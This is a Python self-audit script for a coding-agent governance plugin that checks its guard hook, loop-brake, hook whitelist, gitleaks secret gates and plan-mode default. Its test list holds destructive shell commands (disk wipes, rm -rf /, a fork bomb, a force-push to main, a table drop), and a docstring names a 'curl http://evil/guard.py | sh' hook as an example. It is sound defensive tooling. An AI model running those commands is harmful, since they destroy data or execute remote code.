#!/usr/bin/env python3
"""FORGE self-audit — verify Forge's own enforcement layer is intact.

A governance tool is only as trustworthy as its enforcement layer. That layer can
be silently weakened: the deny-list trimmed, the guard hook re-pointed at a decoy,
a secret gate neutered, a hostile hook slipped in. Nobody notices until it fails in
production. `forge_doctor` is the check that Forge governs itself.

Design choice — BEHAVIOUR over hashes, and audit what actually RUNS. A file-hash
baseline breaks on every honest edit. Substring greps pass on a commented-out
decoy. So this tool:
  * resolves the guard command actually wired to the *blocking* PreToolUse event,
    and behaviour-tests THAT file (not a hard-coded path) — a decoy guard is caught;
  * drives the tool-call ceiling past a threshold and asserts it trips — a neutered
    loop-brake is caught;
  * flags any hook command that does not resolve to a blessed Forge script by path
    — a smuggled `curl … | sh` is caught even if it contains the word "guard.py";
  * accepts a secret gate / plan-mode only via an UNcommented, behaviourally-true
    signal — a commented-out `gitleaks` line does not pass.

Exit 0 iff no FAIL. FAIL = tamper/regression (CI and pre-push should gate on it).
WARN = advisory. Unlike the runtime guard, this tool fails CLOSED: an internal
error is itself a FAIL, because a self-audit that silently passes is worse than none.
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import os
import re
import subprocess
import tempfile
import time
from collections.abc import Sequence
from dataclasses import dataclass
from typing import Any

OK = "OK"
WARN = "WARN"
FAIL = "FAIL"

# Basenames of scripts that are legitimately allowed to run inside a lifecycle hook.
# Anything else wired into a hook is flagged for human review.
_BLESSED_HOOK_SCRIPTS = {"guard.py"}


@dataclass(frozen=True)
class Check:
    name: str
    status: str  # OK | WARN | FAIL
    detail: str


CANARIES: tuple[str, ...] = (
    "rm -rf /",
    "rm -rf ~",
    "rm --recursive --force /",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    "git push --force origin main",
    "git push -f origin main",
    ":(){ :|:& };:",
    "drop table users",
    "chmod -R 777 /",
)

SAFE: tuple[str, ...] = (
    "rm -rf ./build",
    "rm -rf node_modules",
    "git push origin feature-branch",
    "git rm stale.txt && git commit -m cleanup",
    "grep -rf patterns.txt src/",
    "ls -la /etc",
)


def _plugin_root(root: str | None) -> str:
    if root:
        return os.path.abspath(root)
    env = os.environ.get("CLAUDE_PLUGIN_ROOT")
    if env:
        return os.path.abspath(env)
    return os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))


def _resolve_script(command: str, root: str) -> str | None:
    """Resolve the on-disk script a hook command actually invokes, or None.

    Substitutes the plugin-root env var, then returns the first token ending in
    .py/.sh that exists as a file under (or at an absolute path resolvable from)
    the root. A `curl http://evil/guard.py | sh` resolves to None — the token is
    not a real file — which is exactly how we avoid the substring-evasion bug.
    """
    c = command.replace("${CLAUDE_PLUGIN_ROOT}", root).replace("$CLAUDE_PLUGIN_ROOT", root)
    for m in re.finditer(r"""[^\s"'|;&><]+\.(?:py|sh)\b""", c):
        tok = m.group(0)
        p = tok if os.path.isabs(tok) else os.path.join(root, tok)
        p = os.path.normpath(p)
        if os.path.isfile(p):
            return os.path.abspath(p)
    return None


def _load_guard_module(path: str) -> Any:
    spec = importlib.util.spec_from_file_location("forge_guard_under_audit", path)
    if spec is None or spec.loader is None:
        raise ImportError(f"cannot load guard from {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _read_hooks(root: str) -> dict[str, Any] | None:
    path = os.path.join(root, "hooks", "hooks.json")
    try:
        with open(path) as fh:
            data = json.load(fh)
    except (OSError, ValueError):
        return None
    hooks = data.get("hooks") if isinstance(data, dict) else None
    return hooks if isinstance(hooks, dict) else None


def _event_commands(hooks: dict[str, Any], event: str | None = None) -> list[str]:
    """All hook command strings; if `event` given, only that lifecycle event."""
    out: list[str] = []
    items = [(event, hooks.get(event, []))] if event else list(hooks.items())
    for _name, entries in items:
        if not isinstance(entries, list):
            continue
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            for hook in entry.get("hooks", []) or []:
                cmd = hook.get("command", "") if isinstance(hook, dict) else ""
                if cmd:
                    out.append(cmd)
    return out


def resolve_wired_guard(root: str) -> tuple[Any | None, str | None, list[Check]]:
    """Find and load the guard actually wired to the *blocking* PreToolUse event.

    Returns (guard_module_or_None, resolved_path_or_None, checks). The behaviour
    batteries run on whatever is returned — so a decoy wired in place of the real
    guard is what gets tested, and its failure is caught.
    """
    checks: list[Check] = []
    hooks = _read_hooks(root)
    if hooks is None:
        checks.append(Check("guard-hook-wired", FAIL, "hooks.json missing or invalid"))
        return None, None, checks

    pre = hooks.get("PreToolUse")
    pre_cmds = _event_commands(hooks, "PreToolUse")
    if not (isinstance(pre, list) and pre and pre_cmds):
        checks.append(Check("guard-hook-wired", FAIL, "no PreToolUse hook is configured"))
        return None, None, checks

    # Load the first PreToolUse command that resolves to a script exposing is_denied.
    for cmd in pre_cmds:
        path = _resolve_script(cmd, root)
        if not path:
            continue
        try:
            mod = _load_guard_module(path)
        except Exception:  # noqa: BLE001 — a broken/decoy script is not a valid guard
            continue
        if callable(getattr(mod, "is_denied", None)):
            checks.append(
                Check("guard-hook-wired", OK, f"guard wired to PreToolUse: {os.path.relpath(path, root)}")
            )
            return mod, path, checks

    checks.append(
        Check(
            "guard-hook-wired",
            FAIL,
            "PreToolUse is wired, but no command resolves to a loadable guard "
            "(is_denied not found) — the guard may be a decoy or on a non-blocking event",
        )
    )
    return None, None, checks


def check_no_foreign_hooks(root: str) -> Check:
    """Every hook command must resolve to a blessed Forge script under the plugin
    root. A command that resolves elsewhere or to nothing (a URL, a piped shell,
    an arbitrary binary) is flagged — matched by resolved path, never substring."""
    hooks = _read_hooks(root)
    if hooks is None:
        return Check("no-foreign-hooks", FAIL, "hooks.json missing or invalid")
    root_abs = os.path.abspath(root)
    foreign: list[str] = []
    for cmd in _event_commands(hooks):
        path = _resolve_script(cmd, root)
        blessed = (
            path is not None
            and path.startswith(root_abs + os.sep)
            and os.path.basename(path) in _BLESSED_HOOK_SCRIPTS
        )
        if not blessed:
            foreign.append(cmd)
    if foreign:
        return Check("no-foreign-hooks", WARN, f"unreviewed hook command(s): {foreign}")
    return Check("no-foreign-hooks", OK, "every hook resolves to a blessed Forge script")


def check_guard_denies(guard: Any) -> Check:
    leaked = [c for c in CANARIES if not guard.is_denied(c)]
    if leaked:
        return Check("guard-denies-catastrophic", FAIL, f"deny-list weakened — got through: {leaked}")
    return Check("guard-denies-catastrophic", OK, f"all {len(CANARIES)} catastrophic canaries blocked")


def check_guard_allows_safe(guard: Any) -> Check:
    blocked = [c for c in SAFE if guard.is_denied(c)]
    if blocked:
        return Check("guard-allows-safe", FAIL, f"deny-list over-broad — blocks: {blocked}")
    return Check("guard-allows-safe", OK, f"all {len(SAFE)} safe commands allowed")


def check_ceiling_behaves(guard: Any) -> Check:
    """Behaviour-test the loop-brake: drive tick_and_check past a small ceiling and
    assert it trips. A neutered `tick_and_check` (always False) is caught here."""
    tick = getattr(guard, "tick_and_check", None)
    if not callable(tick):
        return Check("ceiling-enforced", FAIL, "tick_and_check() missing — loop-brake removed")
    prev = os.environ.get("FORGE_HOME")
    tmp = tempfile.mkdtemp(prefix="forge-doctor-")
    try:
        os.environ["FORGE_HOME"] = tmp
        with open(os.path.join(tmp, "active_run.json"), "w") as fh:
            json.dump({"started_at": time.time(), "tool_calls": 0, "ceiling": 2}, fh)
        results = [bool(tick()), bool(tick()), bool(tick())]  # counts 1,2,3 vs ceiling 2
        if results == [False, False, True]:
            return Check("ceiling-enforced", OK, "loop-brake trips past the ceiling")
        return Check(
            "ceiling-enforced",
            FAIL,
            f"loop-brake did not enforce the ceiling (tick sequence {results}, expected F,F,T)",
        )
    finally:
        if prev is None:
            os.environ.pop("FORGE_HOME", None)
        else:
            os.environ["FORGE_HOME"] = prev
        import shutil

        shutil.rmtree(tmp, ignore_errors=True)


def _uncommented_lines(path: str) -> list[str]:
    try:
        with open(path) as fh:
            return [ln for ln in fh if ln.strip() and not ln.lstrip().startswith("#")]
    except OSError:
        return []


def check_secret_gates(root: str) -> list[Check]:
    """The secret gates must reference gitleaks on an UNcommented line — a
    commented-out invocation is a neutered gate and must not pass."""
    checks: list[Check] = []
    gates = [
        ("pre-push-secret-gate", os.path.join(root, "templates", "pre-push")),
        ("pre-commit-secret-gate", os.path.join(root, "templates", "pre-commit-config.yaml")),
    ]
    for name, path in gates:
        if not os.path.isfile(path):
            checks.append(Check(name, FAIL, f"missing: {path}"))
        elif any("gitleaks" in ln for ln in _uncommented_lines(path)):
            checks.append(Check(name, OK, "present, references gitleaks (uncommented)"))
        else:
            checks.append(Check(name, FAIL, "no active gitleaks invocation — neutered or commented out?"))

    toml = os.path.join(root, "templates", ".gitleaks.toml")
    checks.append(
        Check("gitleaks-config", OK, "present")
        if os.path.isfile(toml)
        else Check("gitleaks-config", WARN, f"missing: {toml} (gitleaks uses defaults)")
    )
    return checks


def check_plan_mode_first(root: str) -> Check:
    """Behaviour-test plan-mode: run forge-init against a throwaway dir and read the
    settings.json it actually emits. A commented-out 'plan' decoy cannot fool this."""
    init_sh = os.path.join(root, "scripts", "forge-init.sh")
    if not os.path.isfile(init_sh):
        return Check("plan-mode-first", FAIL, f"forge-init.sh missing: {init_sh}")
    tmp = tempfile.mkdtemp(prefix="forge-doctor-init-")
    try:
        subprocess.run(
            ["bash", init_sh, tmp], capture_output=True, text=True, timeout=45,
            env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        )
        settings = os.path.join(tmp, ".claude", "settings.json")
        with open(settings) as fh:
            mode = (json.load(fh).get("permissions", {}) or {}).get("defaultMode")
        if mode == "plan":
            return Check("plan-mode-first", OK, "forge-init emits defaultMode=plan")
        return Check("plan-mode-first", FAIL, f"forge-init emits defaultMode={mode!r}, not 'plan'")
    except Exception as exc:  # noqa: BLE001 — fail CLOSED: can't verify == not verified
        return Check("plan-mode-first", FAIL, f"could not verify plan-mode behaviourally: {exc}")
    finally:
        import shutil

        shutil.rmtree(tmp, ignore_errors=True)


def run_audit(root: str) -> list[Check]:
    """Run every self-audit check against the enforcement layer at `root`.
    Fails CLOSED: if the wired guard cannot be loaded, that is a FAIL, not a skip."""
    checks: list[Check] = []
    guard, path, wiring_checks = resolve_wired_guard(root)
    checks.extend(wiring_checks)
    if guard is not None:
        checks.append(check_guard_denies(guard))
        checks.append(check_guard_allows_safe(guard))
        checks.append(check_ceiling_behaves(guard))
    checks.append(check_no_foreign_hooks(root))
    checks.extend(check_secret_gates(root))
    checks.append(check_plan_mode_first(root))
    return checks


def _worst(checks: Sequence[Check]) -> str:
    if any(c.status == FAIL for c in checks):
        return FAIL
    if any(c.status == WARN for c in checks):
        return WARN
    return OK


_GLYPH = {OK: "✓", WARN: "!", FAIL: "✗"}


def _render(checks: Sequence[Check]) -> str:
    lines = [f"  [{_GLYPH[c.status]}] {c.name}: {c.detail}" for c in checks]
    n_fail = sum(c.status == FAIL for c in checks)
    n_warn = sum(c.status == WARN for c in checks)
    footer = f"verdict: {_worst(checks)}  ({len(checks)} checks, {n_fail} FAIL, {n_warn} WARN)"
    return "\n".join(["FORGE self-audit — enforcement layer", *lines, footer])


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="forge_doctor", description=__doc__)
    parser.add_argument("--root", help="plugin root to audit (default: $CLAUDE_PLUGIN_ROOT or this checkout)")
    parser.add_argument("--json", action="store_true", help="emit machine-readable JSON")
    args = parser.parse_args(argv)

    root = _plugin_root(args.root)
    checks = run_audit(root)
    verdict = _worst(checks)

    if args.json:
        print(
            json.dumps(
                {
                    "root": root,
                    "verdict": verdict,
                    "checks": [{"name": c.name, "status": c.status, "detail": c.detail} for c in checks],
                },
                indent=2,
            )
        )
    else:
        print(_render(checks))
    return 1 if verdict == FAIL else 0


if __name__ == "__main__":
    raise SystemExit(main())
